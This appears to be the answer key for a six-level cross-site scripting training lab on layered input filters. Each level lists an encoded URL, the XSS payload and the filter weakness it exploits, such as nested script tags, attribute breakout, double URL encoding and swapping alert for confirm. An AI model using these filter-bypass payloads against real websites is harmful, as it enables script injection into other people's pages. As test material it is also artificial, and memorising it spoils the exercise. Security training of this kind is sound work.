# nestedfilter — solutions

Layered/sequential filters where one filter's output enables a bypass that survives the next.

### nestedfilter-level1

`/nestedfilter/level1/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: strips <script> then <img>; svg untouched, body reflection

### nestedfilter-level2

`/nestedfilter/level2/?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: input lowercased then <script> stripped; img survives

### nestedfilter-level3

`/nestedfilter/level3/?query=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E`

- payload: `<scr<script>ipt>alert(1)</scr</script>ipt>`
- context: single-pass handler and script strip; nest both script tags

### nestedfilter-level4

`/nestedfilter/level4/?query=%22%20onmouseover%3Dalert(1)%20x%3D%22`

- payload: `" onmouseover=alert(1) x="`
- context: < and > stripped; reflected in input value attribute (breakout)

### nestedfilter-level5

`/nestedfilter/level5/?query=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E`

- payload: `%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E` (URL-decoded once on server to `<img ...>`)
- context: URL-decoded once then script stripped; img survives

### nestedfilter-level6

`/nestedfilter/level6/?query=%3Cimg%20src%3Dx%20onerror%3Dconfirm(1)%3E`

- payload: `<img src=x onerror=confirm(1)>`
- context: "alert" stripped then script stripped; confirm survives
